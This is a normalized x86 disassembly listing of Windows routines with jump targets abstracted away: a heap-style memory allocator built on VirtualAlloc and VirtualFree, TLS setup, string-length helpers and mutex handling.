mov [ esp + 0x8 ] edx
mov [ esp + 0x4 ] eax
jmp sub_3000389f
mov cx [ eax ]
test cx cx
je r-xdata
movzx ecx cx
add ecx eax
movzx ecx [ ecx + 0x2 ]
push esi
lea esi [ edx + 0x4 ]
cmp ecx esi
pop esi
jae r-xdata
retn
cmp ecx edx
je r-xdata
sub_30003a8c
push ebx
push esi
push edi
push rw-data
call [ EnterCriticalSection@IAT ]
mov eax [ esp + 0x14 ]
cmp eax 0xfffc
ja r-xdata
push rw-data
xor esi esi
call [ LeaveCriticalSection@IAT ]
pop edi
mov eax esi
pop esi
pop ebx
retn
mov ecx [ esp + 0x10 ]
mov ebx [ ecx * 4 + rw-data ]
test ebx ebx
je r-xdata
movzx edi [ ebx + 0x4 ]
cmp edi 0xfffc
jne r-xdata
lea esi [ eax + 0xfff ]
mov eax [ esp + 0x18 ]
and esi 0xfffff000
test eax eax
jne r-xdata
mov edi 0x10000
mov ecx edi
sub ecx esi
cmp ecx 0x1000
jl r-xdata
push ebx
call sub_3000399d
add esp 0x4
mov ecx esi
sub ecx edi
cmp ecx 0x1000
jl r-xdata
push 0x4000
push ecx
lea edx [ ebx + esi ]
push edx
call [ VirtualFree@IAT ]
test eax eax
jne r-xdata
mov ecx esi
shr ecx 0x10
je r-xdata
mov edx eax
and edx 0x7ff
cmp edx 0x780
jl r-xdata
mov esi edi
jmp r-xdata
push rw-data
mov [ ebx + 0x4 ] si
call [ LeaveCriticalSection@IAT ]
pop edi
mov eax esi
pop esi
pop ebx
retn
mov esi 0xfffc
and eax 0x800
neg eax
sbb eax eax
and eax 0x3c
add eax 0x4
mov eax 0x4
jmp r-xdata
push eax
push 0x1000
push ecx
lea eax [ ebx + edi ]
push eax
call [ VirtualAlloc@IAT ]
test eax eax
je r-xdata
sub_30003b89
sub esp 0x8
cmp [ rw-data ] 0x0
push ebp
mov ebp [ esp + 0x10 ]
mov [ esp + 0x4 ] ebp
jne r-xdata
pop ebp
add esp 0x8
retn 0x8
push edi
push rw-data
call [ EnterCriticalSection@IAT ]
push ebp
call sub_30003956
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
push ebp
push edi
call sub_300037e7
add esp 0x8
test eax eax
jne r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
pop edi
pop ebp
add esp 0x8
retn 0x8
push ebx
push esi
mov esi [ esp + 0x20 ]
cmp esi 0x4
jae r-xdata
movzx ebx [ edi + 0x6 ]
add esi 0x3
and esi 0xfffffffc
cmp ebx 0xffff
jne r-xdata
mov esi 0x4
and [ ebx * 2 + rw-data ] 0x7f
mov eax [ esp + 0x1c ]
movzx ebp [ ebp - 0x2 ]
movzx ecx ax
cmp ebp ecx
jge r-xdata
mov edx [ rw-data ]
push sub_300037ad
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x18 ]
push ecx
push edx
mov [ esp + 0x20 ] edi
call sub_30004e8b
mov eax [ esp + 0x1c ]
mov ecx [ rw-data ]
push 0x1
push eax
push ecx
call sub_300051b9
mov edx [ esp + 0x10 ]
push 0x8000
push 0x0
push edx
call [ VirtualFree@IAT ]
jmp r-xdata
mov ebp [ esp + 0x10 ]
lea edx [ ebp + 0x3 ]
and edx 0xfffffffc
cmp edx ebp
jne r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
pop esi
pop ebx
pop edi
movzx edx [ edi + 0x4 ]
movzx eax bp
lea ecx [ eax + esi ]
cmp ecx edx
jne r-xdata
movzx ecx [ eax + 0x2 ]
lea edx [ ecx + 0x3 ]
and edx 0xfffffffc
cmp edx ecx
mov [ esp + 0x1c ] ecx
jne r-xdata
sub eax ebp
movzx ecx [ eax + 0x2 ]
cmp ecx ebp
mov [ esp + 0x1c ] eax
jne r-xdata
mov ax [ edi ]
movzx ecx si
mov [ ebp ] ax
mov [ ebp + 0x2 ] si
mov [ ecx + ebp - 0x2 ] si
mov [ edi ] bp
jmp r-xdata
cmp bp 0xc
jne r-xdata
add ecx eax
cmp ecx [ esp + 0x20 ]
ja r-xdata
push eax
push edi
call sub_3000383c
add esp 0x8
test eax eax
je r-xdata
cmp esi 0x1200
mov [ edi + 0x2 ] bp
jle r-xdata
push ebx
call sub_30003770
mov eax [ rw-data ]
add esp 0x4
cmp ebx eax
mov [ ebx * 2 + rw-data ] 0x0
jne r-xdata
mov ecx [ esp + 0x1c ]
movzx edx [ ecx + eax - 0x2 ]
cmp ecx edx
jne r-xdata
add esi ebp
mov ebp [ esp + 0x1c ]
jmp r-xdata
and [ ebx * 2 + rw-data ] 0xbf
push 0x0
add eax 0x200
push eax
push ebx
call sub_30003a8c
mov edi [ ebx * 4 + rw-data ]
movzx ecx bp
add esp 0xc
sub eax ecx
mov esi eax
cmp [ eax * 4 + rw-data ] 0x0
jne r-xdata
push eax
push edi
call sub_3000383c
add esp 0x8
test eax eax
je r-xdata
movzx edx [ edi + 0x4 ]
lea ecx [ edx + edi ]
lea eax [ esi + ebp ]
lea edx [ eax + 0x4 ]
cmp edx ecx
mov [ esp + 0x20 ] ecx
ja r-xdata
cmp eax 0x4000
jae r-xdata
add esi [ esp + 0x1c ]
mov [ rw-data ] eax
add eax 0x1
cmp [ eax * 4 + rw-data ] 0x0
je r-xdata
sub_30003d97
sub esp 0x8
push edi
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
xor eax eax
pop edi
add esp 0x8
retn
cmp [ rw-data ] 0x0
jne r-xdata
push esi
push rw-data
call [ EnterCriticalSection@IAT ]
mov edx [ rw-data ]
mov esi [ esp + 0x14 ]
and [ esp + 0xc ] 0x80000000
push sub_300037b9
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x10 ]
push ecx
push edx
mov [ esp + 0x18 ] esi
call sub_30004e8b
test eax eax
je r-xdata
lea eax [ esi + edi + 0x3 ]
and al 0xfc
lea ecx [ esi + 0x3 ]
and ecx 0xfffffffc
sub eax ecx
cmp eax 0x4
jge r-xdata
mov eax [ rw-data ]
mov ecx [ eax + 0xc ]
mov edx [ esp + 0x18 ]
mov edi [ ecx + edx * 8 + 0x4 ]
lea eax [ ecx + edx * 8 ]
mov ecx [ eax ]
sub esi ecx
add esi 0xfff
and esi 0xfffff000
and edi 0x7fffffff
sub edi esi
je r-xdata
push eax
push ecx
call sub_30003b89
push rw-data
call [ LeaveCriticalSection@IAT ]
pop esi
mov eax edi
pop edi
add esp 0x8
retn
push rw-data
xor edi edi
call [ LeaveCriticalSection@IAT ]
pop esi
mov eax edi
pop edi
add esp 0x8
retn
mov ecx [ rw-data ]
mov edx [ ecx + 0xc ]
mov eax [ esp + 0x18 ]
mov ecx [ edx + eax * 8 + 0x4 ]
lea eax [ edx + eax * 8 + 0x4 ]
xor ecx esi
and ecx 0x7fffffff
xor [ eax ] ecx
push rw-data
call [ LeaveCriticalSection@IAT ]
pop esi
mov eax edi
pop edi
add esp 0x8
retn
push 0x4000
push edi
lea eax [ esi + ecx ]
push eax
call [ VirtualFree@IAT ]
sub_30003ea7
mov edx [ esp + 0x4 ]
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi [ edx * 4 + rw-data ]
mov ax [ esi + 0x2 ]
test ax ax
push edi
movzx edi [ esi + 0x4 ]
lea ecx [ edi + ebp + 0x4 ]
je r-xdata
cmp ecx 0xfffc
ja r-xdata
movzx eax ax
movzx eax [ eax + esi + 0x2 ]
sub ecx eax
or eax 0xffffffff
mov eax [ esp + 0x18 ]
push eax
push ecx
push edx
call sub_30003a8c
mov ecx eax
add esp 0xc
test ecx ecx
je r-xdata
mov ax [ esi + 0x2 ]
test ax ax
je r-xdata
mov dx [ esi ]
lea eax [ edi + esi ]
mov [ eax ] dx
mov [ esi + 0x2 ] ax
mov [ esi ] ax
movzx eax ax
add eax esi
jmp r-xdata
mov edx eax
and dl 0x7
neg dl
sbb edx edx
add edx 0x1
and ecx 0x2
xor edx ecx
je r-xdata
lea edx [ ebp + 0x4 ]
cmp esi edx
jge r-xdata
movzx edx ax
sub ecx edx
mov esi ecx
movzx ecx si
mov [ eax + 0x2 ] si
mov [ ecx + eax - 0x2 ] si
mov ecx [ rw-data ]
test cl 0x1
jne r-xdata
xor ecx ecx
cmp esi ebp
setg cl
xor ecx ecx
cmp esi ebp
setge cl
jmp r-xdata
pop edi
pop esi
pop ebp
retn
cmp esi ebp
jne r-xdata
test ecx ecx
jne r-xdata
pop edi
pop esi
pop ebp
retn
sub_30003f70
sub esp 0xc
push ebx
push ebp
mov ebp [ esp + 0x20 ]
test ebp 0x1000
push esi
push edi
jne r-xdata
mov eax [ esp + 0x24 ]
cmp eax 0xfff0
mov ecx [ rw-data ]
jb r-xdata
mov eax ebp
and eax 0x7ff
cmp eax 0x1
je r-xdata
cmp eax 0x2000
jl r-xdata
test ecx ecx
jne r-xdata
or ebp 0x2000
mov [ esp + 0x28 ] ebp
cmp eax 0x4
jae r-xdata
test ecx ecx
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xc
retn
lea ebx [ eax + 0x3 ]
mov eax ebp
and eax 0x7ff
and ebx 0xfffffffc
cmp eax 0x1
mov [ esp + 0x24 ] ebx
mov [ esp + 0x10 ] eax
jne r-xdata
mov eax 0x4
mov ebx [ VirtualAlloc@IAT ]
push 0x1
lea ecx [ eax + 0x1000b ]
push 0x2000
and ecx 0xffff0000
push ecx
lea esi [ eax + 0x100b ]
push 0x0
and esi 0xfffff000
call ebx
mov edi eax
test edi edi
je r-xdata
cmp ebp [ rw-data ]
jne r-xdata
mov edi [ rw-data ]
cmp edi 0x4000
jae r-xdata
push 0x4
push 0x1000
push esi
push edi
call ebx
test eax eax
je r-xdata
mov edi [ rw-data ]
cmp edi 0x4000
jae r-xdata
mov edi [ rw-data ]
mov dx [ edi * 2 + rw-data ]
xor edx ebp
test edx 0x37ff
jne r-xdata
mov edi [ rw-data ]
cmp edi 0x4000
jae r-xdata
movzx ecx [ edi * 2 + rw-data ]
mov eax ecx
and eax 0x7ff
cmp eax 0x780
jge r-xdata
push 0x8000
push 0x0
push edi
call [ VirtualFree@IAT ]
mov ecx ebp
shl ecx 0x12
push 0x2002
xor ecx esi
mov esi [ rw-data ]
push 0x8
lea edx [ esp + 0x1c ]
and ecx 0x7fffffff
shl ebp 0x12
push edx
xor ecx ebp
push rw-data
mov [ esp + 0x24 ] edi
mov [ esp + 0x28 ] ecx
mov [ rw-data ] 0x0
call sub_30005174
cmp eax 0xffffffff
mov [ rw-data ] esi
je r-xdata
lea ebx [ ebx ]
mov esi [ edi * 4 + rw-data ]
push ebx
push esi
call sub_30003a4f
mov ebp eax
add esp 0x8
cmp ebp 0xffffffff
je r-xdata
mov edi 0x3fff
nop
add edi 0x1
cmp edi 0x4000
jb r-xdata
mov edx ecx
and edx 0x700
cmp edx 0x400
je r-xdata
mov eax [ esp + 0x20 ]
mov [ edi + 0x6 ] 0xffff
add edi 0xc
mov [ eax ] edi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xc
retn
add edi 0x1
cmp edi 0x4000
jb r-xdata
test bh bh
js r-xdata
mov ebp [ esp + 0x28 ]
movzx ecx [ ebp ]
add ecx esi
jmp r-xdata
mov ebp [ esp + 0x24 ]
mov ebx [ VirtualAlloc@IAT ]
push 0x1
push 0x2000
push 0xfffc
add ebp 0x100b
push 0x0
and ebp 0xfffff000
call ebx
mov esi eax
test esi esi
je r-xdata
sub edi 0x1
cmp edi 0x4
jae r-xdata
mov edx eax
xor edx ebp
test edx 0x37ff
jne r-xdata
movzx edx ax
mov ecx edx
and ecx 0x7ff
cmp ecx 0x780
jge r-xdata
jmp r-xdata
cmp eax 0x5
je r-xdata
movzx ebx [ edi * 2 + rw-data ]
mov eax ebx
xor eax [ esp + 0x28 ]
test eax 0x37ff
jne r-xdata
mov ebx [ esp + 0x24 ]
mov ebp [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
mov esi [ edi * 4 + rw-data ]
push ecx
push esi
call sub_30003a4f
mov ebp eax
add esp 0x8
cmp ebp 0xffffffff
jne r-xdata
mov eax [ rw-data ]
test al 0x1
je r-xdata
test [ esp + 0x29 ] 0x8
jne r-xdata
mov eax [ esp + 0x28 ]
and eax 0x800
neg eax
sbb eax eax
and eax 0x3c
add eax 0x4
push eax
push 0x1000
push ebp
push esi
call ebx
cmp esi eax
jne r-xdata
cmp [ edi * 4 + rw-data ] 0x0
je r-xdata
add edi 0x1
cmp edi 0x4000
jb r-xdata
test ah 0x40
jne r-xdata
mov esi edx
and esi 0x700
cmp esi 0x400
je r-xdata
test ecx ecx
je r-xdata
cmp [ esp + 0x24 ] 0x400
jge r-xdata
movzx edx [ ecx + 0x2 ]
mov eax [ esp + 0x24 ]
sub edx eax
jne r-xdata
mov edx ecx
and dl 0x7
neg dl
sbb edx edx
add edx 0x1
and eax 0x2
xor edx eax
jne r-xdata
mov edi [ rw-data ]
cmp edi 0x4000
mov ebx [ esp + 0x24 ]
jae r-xdata
mov ecx ebp
shr ecx 0x10
mov [ edi * 4 + rw-data ] esi
je r-xdata
cmp [ esp + 0x10 ] 0x1
mov ax [ edi * 2 + rw-data ]
jne r-xdata
push ebp
push ebx
push edi
call sub_30003ea7
mov ecx eax
add esp 0xc
cmp ecx 0xffffffff
jne r-xdata
cmp ecx 0x5
je r-xdata
test [ rw-data ] 0x1
mov esi [ edi * 4 + rw-data ]
jne r-xdata
or bh 0x80
mov [ edi * 2 + rw-data ] bx
add eax ecx
mov [ ebp ] ax
mov bx [ ecx ]
mov [ eax + 0x2 ] dx
mov [ eax ] bx
mov [ eax + edx - 0x2 ] dx
movzx edx [ esi + 0x2 ]
add edx esi
cmp ecx edx
jne r-xdata
mov ax [ ecx ]
mov [ ebp ] ax
cmp cx [ esi + 0x2 ]
jne r-xdata
movzx ebp [ ecx + 0x2 ]
mov eax ebp
sub eax [ esp + 0x24 ]
test al 0x7
je r-xdata
mov edi [ rw-data ]
cmp edi 0x4000
jae r-xdata
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
test ebp ebp
je r-xdata
mov ebp 0xfffc
jmp r-xdata
and [ edi * 2 + rw-data ] 0x7f
jmp r-xdata
cmp ebx 0x400
jge r-xdata
test edx edx
jne r-xdata
push ebx
push esi
call sub_3000389f
add esp 0x8
mov ebp eax
mov ax [ esi ]
test ax ax
je r-xdata
mov ax [ edi * 2 + rw-data ]
mov edx eax
and edx 0x7ff
cmp edx 0x1
mov edx [ esp + 0x28 ]
jne r-xdata
mov [ esi + 0x2 ] ax
mov [ esi + 0x2 ] 0x0
jmp r-xdata
mov bx [ ecx ]
xor edx edx
cmp eax 0x18
setg dl
lea edx [ edx * 8 + 0x4 ]
sub ebp edx
lea eax [ edx + ecx ]
mov [ eax ] bx
mov [ eax + 0x2 ] bp
mov [ eax + ebp - 0x2 ] bp
movzx ebx [ esi + 0x2 ]
add ebx esi
cmp ecx ebx
jne r-xdata
cmp cx [ esi + 0x2 ]
jne r-xdata
cmp [ edi * 4 + rw-data ] 0x0
je r-xdata
add edi 0x1
cmp edi 0x4000
jb r-xdata
mov cx [ edi * 2 + rw-data ]
mov eax ecx
and eax 0x7ff
cmp eax 0x780
jae r-xdata
cmp edi [ rw-data ]
jae r-xdata
mov esi [ edi * 4 + rw-data ]
movzx eax [ esi ]
add eax esi
cmp eax esi
mov ebp esi
mov ebx esi
mov [ esp + 0x14 ] 0x0
je r-xdata
or [ edi * 2 + rw-data ] 0x40
jmp r-xdata
mov ebp [ esp + 0x28 ]
movzx eax ax
add eax esi
movzx eax [ eax + 0x2 ]
lea ecx [ ebx + 0x4 ]
cmp eax ecx
jae r-xdata
mov esi edx
and esi 0xf800
or esi eax
mov [ edi * 2 + rw-data ] si
and eax 0xf800
or eax edx
mov [ edi * 2 + rw-data ] ax
jmp r-xdata
mov [ ecx + 0x2 ] dx
mov [ ecx ] ax
mov ebp ecx
mov [ eax - 0x2 ] dx
mov ecx eax
mov [ esi + 0x2 ] ax
mov [ ecx + 0x2 ] ax
mov [ eax + ecx - 0x2 ] ax
movzx edx [ esi + 0x2 ]
add edx esi
cmp ecx edx
jne r-xdata
cmp eax 0x18
jg r-xdata
add edi 0x1
cmp edi 0x4000
jb r-xdata
mov dx [ edi * 2 + rw-data ]
and edx 0x7ff
cmp edx 0x780
jae r-xdata
cmp [ esp + 0x10 ] 0x1
jne r-xdata
mov dx [ esp + 0x28 ]
mov [ edi * 2 + rw-data ] dx
mov [ esi + 0x4 ] bp
lea ecx [ esi + 0xc ]
lea eax [ ebp - 0xc ]
mov [ esi + 0x6 ] di
mov [ esi + 0x8 ] 0x1
mov [ esi ] 0xc
mov [ esi + 0x2 ] 0xc
mov [ ecx + 0x2 ] ax
mov [ ecx ] 0x0
mov [ eax + ecx - 0x2 ] ax
mov ebp esi
jmp r-xdata
mov [ rw-data ] edi
nop
mov ebp esi
jmp r-xdata
cmp eax ebx
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xc
retn
mov [ rw-data ] edi
mov [ rw-data ] edx
cmp [ esp + 0x10 ] 0x1
mov eax [ esp + 0x20 ]
mov [ eax ] ecx
je r-xdata
add ecx eax
jmp r-xdata
mov [ esi + 0x2 ] 0x0
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xc
retn
push 0x0
push ebx
push edi
call sub_30003ea7
mov ecx eax
add esp 0xc
cmp ecx 0xffffffff
jne r-xdata
mov edx ecx
xor edx [ esp + 0x28 ]
test edx 0x37ff
jne r-xdata
movzx edx cx
mov eax edx
and eax 0x7ff
cmp eax 0x780
jge r-xdata
cmp eax ecx
je r-xdata
movzx edx [ 0x0 ]
test edx edx
je r-xdata
cmp ebp 0xffffffff
jne r-xdata
and [ edi * 2 + rw-data ] 0x3f
cmp ebx 0x400
jge r-xdata
test [ rw-data ] 0x1
jne r-xdata
test ch ch
jns r-xdata
mov ebp edx
and ebp 0x700
cmp ebp 0x400
je r-xdata
mov ebp eax
movzx eax [ eax ]
xor edx edx
add eax esi
cmp [ esp + 0x14 ] edx
sete dl
test edx edx
mov [ esp + 0x14 ] edx
je r-xdata
or [ edi * 2 + rw-data ] 0x40
push ebx
push esi
call sub_3000389f
add esp 0x8
mov ebp eax
mov ax [ esi ]
test ax ax
je r-xdata
cmp eax 0x5
je r-xdata
cmp eax esi
jne r-xdata
movzx ebx [ ebx ]
add ebx esi
movzx ecx [ ebp ]
add ecx esi
and [ edi * 2 + rw-data ] 0x7f
jmp r-xdata
cmp ebx 0x400
jge r-xdata
movzx eax ax
add eax esi
movzx eax [ eax + 0x2 ]
lea ecx [ ebx + 0x4 ]
cmp eax ecx
jae r-xdata
test edx edx
je r-xdata
cmp eax ebx
jne r-xdata
or [ edi * 2 + rw-data ] 0x80
mov ebp esi
jmp r-xdata
cmp eax ebx
jne r-xdata
jmp r-xdata
cmp ebp 0xffffffff
jne r-xdata
sub_3000468a
mov eax [ esp + 0x4 ]
sub esp 0x8
push ebx
mov ebx [ esp + 0x14 ]
push ebp
mov ebp [ eax ]
push esi
mov esi [ esp + 0x20 ]
cmp esi ebx
je r-xdata
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x8
retn
lea ecx [ ebx + 0x3 ]
lea edx [ esi + 0x3 ]
and ecx 0xfffffffc
and edx 0xfffffffc
cmp ecx edx
jl r-xdata
push ebp
call sub_30003956
add esp 0x4
test eax eax
jne r-xdata
sub ebx esi
push ebx
add ebp esi
push ebp
call sub_30003d97
add esp 0x8
cmp [ eax + 0x6 ] 0xffff
push edi
jne r-xdata
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov edx [ esp + 0x28 ]
push edx
lea eax [ esp + 0x28 ]
push esi
push eax
call sub_30003f70
add esp 0xc
test eax eax
jne r-xdata
mov edx [ rw-data ]
push sub_300037ad
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x28 ]
push eax
lea ecx [ esp + 0x18 ]
push ecx
push edx
call sub_30004e8b
test eax eax
je r-xdata
cmp ebx esi
mov ecx ebx
jl r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov ecx [ rw-data ]
mov edx [ ecx + 0xc ]
mov ecx [ esp + 0x24 ]
mov edx [ edx + ecx * 8 + 0x4 ]
lea eax [ esi + 0xc ]
and edx 0x7fffffff
cmp edx eax
jae r-xdata
mov edi [ esp + 0x24 ]
mov edx ecx
shr ecx 0x2
mov esi ebp
[ edi ] [ esi ]
mov ecx edx
push ebx
and ecx 0x3
push ebp
[ edi ] [ esi ]
call sub_30003b89
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x1c ]
mov [ ecx ] eax
mov ecx esi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x8
retn
push 0x4
lea edi [ eax + 0xfff ]
mov eax [ esp + 0x14 ]
push 0x1000
and edi 0xfffff000
push edi
push eax
call [ VirtualAlloc@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov edx [ ecx + 0xc ]
mov eax [ esp + 0x24 ]
mov ecx [ edx + eax * 8 + 0x4 ]
lea eax [ edx + eax * 8 + 0x4 ]
xor ecx edi
pop edi
pop esi
and ecx 0x7fffffff
xor [ eax ] ecx
pop ebp
mov eax 0x1
pop ebx
add esp 0x8
retn
sub_300047f0
push esi
mov esi [ esp + 0xc ]
test esi esi
jl r-xdata
xor eax eax
pop esi
retn 0xc
push rw-data
call [ EnterCriticalSection@IAT ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
push eax
push esi
push ecx
call sub_30003f70
add esp 0xc
test eax eax
jne r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax 0x1
pop esi
retn 0xc
push 0xe004000e
call [ SetLastError@IAT ]
push rw-data
call [ LeaveCriticalSection@IAT ]
sub_3000484b
push esi
mov esi [ esp + 0x10 ]
test esi esi
jl r-xdata
xor eax eax
pop esi
retn 0x10
push rw-data
call [ EnterCriticalSection@IAT ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push esi
push ecx
push edx
call sub_3000468a
add esp 0x10
test eax eax
jne r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax 0x1
pop esi
retn 0x10
push 0xe004000e
call [ SetLastError@IAT ]
push rw-data
call [ LeaveCriticalSection@IAT ]
sub_300048c4
push esi
mov esi [ esp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
pop esi
retn 0x8
mov eax [ esp + 0xc ]
push eax
lea ecx [ esi + 0x4 ]
push ecx
lea edx [ esp + 0x10 ]
push edx
call sub_300047f0
test eax eax
jne r-xdata
mov eax [ esp + 0x8 ]
mov [ eax ] esi
add eax 0x4
pop esi
retn 0x8
sub_300048f7
push esi
mov esi [ esp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
pop esi
retn
push 0x2
lea eax [ esi + 0x4 ]
push eax
lea ecx [ esp + 0x10 ]
push ecx
call sub_300047f0
test eax eax
jne r-xdata
mov eax [ esp + 0x8 ]
mov [ eax ] esi
add eax 0x4
pop esi
retn
sub_30004923
and [ rw-data ] 0x0
call [ GetSystemDefaultLCID@IAT ]
mov [ rw-data ] eax
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
jne r-xdata
push 0xfa0
push rw-data
call [ InitializeCriticalSectionAndSpinCount@IAT ]
neg eax
sbb eax eax
neg eax
xor eax eax
jmp r-xdata
retn 0x4
sub_30004989
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
xor eax eax
inc eax
retn
push eax
call [ TlsGetValue@IAT ]
test eax eax
je r-xdata
push 0x8000
push 0x0
push eax
call [ VirtualFree@IAT ]
push 0x0
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_300049be
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
test eax 0x3
je r-xdata
mov edx [ eax ]
lea eax [ eax + 0x4 ]
mov ecx edx
sub edx 0x1010101
xor edx ecx
and edx 0x80808080
je r-xdata
cmp [ eax ] 0x0
je r-xdata
test cl cl
lea eax [ eax - 0x4 ]
je r-xdata
sub eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
lea eax [ eax + 0x1 ]
test eax 0x3
je r-xdata
test ecx 0xff00
lea eax [ eax + 0x1 ]
je r-xdata
cmp [ eax ] 0x0
je r-xdata
test ecx 0xff0000
lea eax [ eax + 0x1 ]
je r-xdata
lea eax [ eax + 0x1 ]
test eax 0x3
je r-xdata
test ecx 0xff000000
lea eax [ eax + 0x1 ]
je r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ eax + 0x1 ]
jmp r-xdata
lea eax [ eax + 0x1 ]
sub_30004a45
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
test eax 0x3
je r-xdata
mov edx [ eax ]
lea eax [ eax + 0x4 ]
mov ecx edx
sub edx 0x10001
xor edx ecx
and edx 0x80008000
je r-xdata
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp + 0x8 ]
shr eax 0x1
test cx cx
lea eax [ eax - 0x2 ]
je r-xdata
sub eax [ ebp + 0x8 ]
shr eax 0x1
jmp r-xdata
lea eax [ eax + 0x2 ]
test eax 0x3
je r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
test ecx 0xffff0000
lea eax [ eax + 0x1 ]
je r-xdata
jmp r-xdata
lea eax [ eax * 2 + 0x2 ]
add eax [ ebp + 0x8 ]
jmp r-xdata
sub_30004ab3
push esi
push edi
mov edi [ esp + 0x10 ]
push edi
call sub_30004a45
mov ecx [ esp + 0x14 ]
add eax 0x1
cmp ecx eax
jb r-xdata
lea esi [ ecx + ecx - 0x2 ]
push esi
push edi
mov edi [ esp + 0x14 ]
push edi
call memmove
lea eax [ edi + esi ]
add esp 0xc
pop edi
mov [ eax ] 0x0
pop esi
retn 0xc
lea esi [ eax + eax ]
push esi
push edi
mov edi [ esp + 0x14 ]
push edi
call memmove
add esp 0xc
lea eax [ esi + edi - 0x2 ]
pop edi
pop esi
retn 0xc
sub_30004b05
push esi
push edi
mov edi [ esp + 0x10 ]
push edi
call sub_300049be
mov esi eax
mov eax [ esp + 0x14 ]
add esi 0x1
cmp eax esi
jb r-xdata
lea esi [ eax - 0x1 ]
push esi
push edi
mov edi [ esp + 0x14 ]
push edi
call memmove
lea eax [ edi + esi ]
add esp 0xc
pop edi
mov [ eax ] 0x0
pop esi
retn 0xc
push esi
push edi
mov edi [ esp + 0x14 ]
push edi
call memmove
add esp 0xc
lea eax [ esi + edi - 0x1 ]
pop edi
pop esi
retn 0xc
sub_30004b95
mov eax [ esp + 0x8 ]
cmp [ eax ] 0x0
mov ecx [ esp + 0xc ]
je r-xdata
test ecx ecx
jle r-xdata
mov edi edi
retn 0xc
mov [ esp + 0xc ] ecx
mov ecx [ esp + 0x4 ]
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] eax
jmp sub_30004ab3
add eax 0x2
sub ecx 0x1
cmp [ eax ] 0x0
jne r-xdata
sub_30004bcd
mov eax [ esp + 0x8 ]
cmp [ eax ] 0x0
mov ecx [ esp + 0xc ]
je r-xdata
test ecx ecx
jle r-xdata
lea ecx [ ecx ]
retn 0xc
mov [ esp + 0xc ] ecx
mov ecx [ esp + 0x4 ]
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] eax
jmp sub_30004b05
add eax 0x1
sub ecx 0x1
cmp [ eax ] 0x0
jne r-xdata
sub_30004c03
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
lea eax [ ecx + eax - 0x1 ]
cmp [ eax ] 0x5c
je r-xdata
inc eax
cmp eax ecx
je r-xdata
cmp [ eax ] 0x5c
jne r-xdata
dec eax
cmp [ eax ] 0x5c
jne r-xdata
retn 0x8
sub_30004c27
push ebp
mov ebp esp
sub esp 0x40c
mov eax [ rw-data ]
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
mov [ ebp - 0x4 ] eax
push esi
je r-xdata
xor eax eax
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
push edi
mov edi [ ebp + 0x20 ]
push edi
push [ ebp + 0xc ]
lea eax [ ebp - 0x404 ]
push 0x400
push eax
mov [ ebp - 0x40c ] 0x1
mov [ esi ] ebx
call sub_30005c9a
mov [ ebp - 0x408 ] eax
mov [ ebp + 0xc ] ebx
mov [ ebp + 0x8 ] ebx
cmp [ esi ] ebx
jne r-xdata
push [ ebp - 0x408 ]
mov eax edi
shr eax 0x17
and eax 0x1
push eax
push 0x120001
call [ OpenMutexA@IAT ]
mov [ esi ] eax
mov eax [ esi ]
cmp eax ebx
pop edi
je r-xdata
mov eax edi
shr eax 0x1a
not eax
test al 0x1
je r-xdata
mov [ esi ] ebx
mov [ ebp + 0xc ] ebx
mov [ ebp - 0x40c ] ebx
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebp + 0x1c ]
push eax
push edi
call sub_30005b6b
test eax eax
je r-xdata
mov eax [ ebp + 0x18 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x408 ]
call sub_30004b75
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] 0x0
je r-xdata
push [ ebp - 0x408 ]
mov eax edi
shr eax 0x19
and eax 0x1
push eax
push [ ebp + 0x1c ]
call [ CreateMutexA@IAT ]
mov [ esi ] eax
call [ GetLastError@IAT ]
mov ebx eax
lea eax [ ebp + 0x1c ]
push eax
push edi
call sub_30005c5e
cmp ebx 0x5
jne r-xdata
mov eax [ ebp - 0x40c ]
